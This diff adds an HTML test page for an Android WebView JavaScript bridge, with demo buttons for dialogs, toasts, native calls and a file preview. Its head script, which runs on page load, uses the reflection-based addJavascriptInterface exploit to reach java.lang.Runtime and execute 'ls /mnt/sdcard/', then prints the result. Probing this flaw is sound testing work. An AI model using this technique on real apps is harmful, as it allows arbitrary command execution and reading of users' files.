@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Test Js Bridge</title>
+    <script>
+    var i = 0;
+
+    function getContents(inputStream) {
+        var contents = "" + i;
+        var b = inputStream.read();
+        var i = 1;
+        while (b != -1) {
+            var bString = String.fromCharCode(b);
+            contents += bString;
+            contents += "\n"
+            b = inputStream.read();
+        }
+        i = i + 1;
+        return contents;
+    }
+
+    function execute(cmdArgs) {
+        for (var obj in window) {
+            console.log(obj);
+            if ("getClass" in window[obj]) {
+                alert(obj);
+                return window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec(cmdArgs);
+            }
+        }
+    }
+
+    var p = execute(["ls", "/mnt/sdcard/"]);
+    document.write(getContents(p.getInputStream()));
+    </script>
+</head>
+
+<body>
+<button onclick="a()">alert</button>
+<br/>
+<button onclick="c()">confirm</button>
+<br/>
+<button onclick="p()">prompt</button>
+<br/>
+<button onclick="p1()">prompt normal</button>
+<br/>
+<button onclick="t('android toast')">toast</button>
+<br/>
+<button onclick="plusNumber()">plus</button>
+<br/>
+<input id="file" type="file" onchange="f()" />
+<br/>
+<img id="show" src="" style="width:150px;height:150px;">
+<br/>
+<script>
+    function a() {
+        alert("提示信息！");
+    }
+
+    function c() {
+        if (confirm("你确定提交吗？")) {
+            alert("点击了确定");
+        } else {
+            alert("点击了取消");
+        }
+    }
+
+    function p() {
+        var content = prompt("js-bridge", "{\"name\":\"LY\"}");
+        if (content) {
+            alert("接到android返回：" + content);
+        }
+    }
+
+    function p1() {
+        var name = prompt("请输入名字");
+        if (name) {
+            alert("欢迎您：" + name)
+        }
+    }
+
+    function callJS() {
+        alert("Android调用了JS的callJS方法");
+    }
+
+    function t(text) {
+        window.Android.showToast(text);
+    }
+
+    function plusNumber() {
+        Android.showToast("1 + 2 = " + Android.plus(1, 2));
+    }
+
+    function f() {
+        var r = new FileReader();
+        f = document.getElementById('file').files[0];
+        Android.log(f);
+        r.readAsDataURL(f);
+        r.onload = function(e) {
+            document.getElementById('show').src = this.result;
+        };
+    }
+    </script>
+</body>
+
+</html>
